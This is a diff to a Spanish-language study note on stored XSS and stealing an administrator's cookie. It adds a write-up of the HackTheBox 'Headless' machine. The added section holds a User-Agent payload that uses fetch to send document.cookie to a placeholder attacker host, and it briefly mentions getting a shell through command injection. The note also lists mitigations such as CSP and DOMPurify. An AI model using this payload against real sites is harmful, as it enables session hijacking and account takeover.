@@ -1,6 +1,6 @@
 ---
 topic: XSS almacenado — robo de la cookie de administrador
-tags: [web, xss, cookies, admin-bot, imagery]
+tags: [web, xss, cookies, admin-bot, imagery, headless]
 ---
 
 # XSS almacenado — robo de la cookie de administrador
@@ -63,6 +63,16 @@ En el navegador: DevTools → Application → Cookies → sustituir el valor y r
 - Implementar CSP con nonces y sin `unsafe-inline`.
 - Sanitizar HTML con una allowlist (DOMPurify) si se permite formato.
 - Revisar el contenido en un dominio aislado.
+
+## Caso real: Headless
+
+El formulario de contacto de `headless.htb` refleja HTML y avisa de que las cabeceras de la petición se reenvían para análisis. El XSS no va en el cuerpo, sino en `User-Agent`:
+
+```http
+User-Agent: <script>fetch('http://<ATTACKER>/?c='+document.cookie)</script>
+```
+
+Cuando el administrador revisa la consulta, el script se ejecuta, la cookie llega al listener y el dashboard queda abierto. Allí un formulario de diagnóstico con command injection da la shell. La lección es doble: cualquier cabecera que se almacene y se muestre en el panel es un campo de XSS, y la cookie robada puede abrir una superficie con más privilegios que la inicial. En *Beyond Root*, 0xdf decodifica y modifica la cookie, lo que recuerda que una cookie de sesión legible por JavaScript basta para escalar dentro de la aplicación.
 
 ## Detección
 
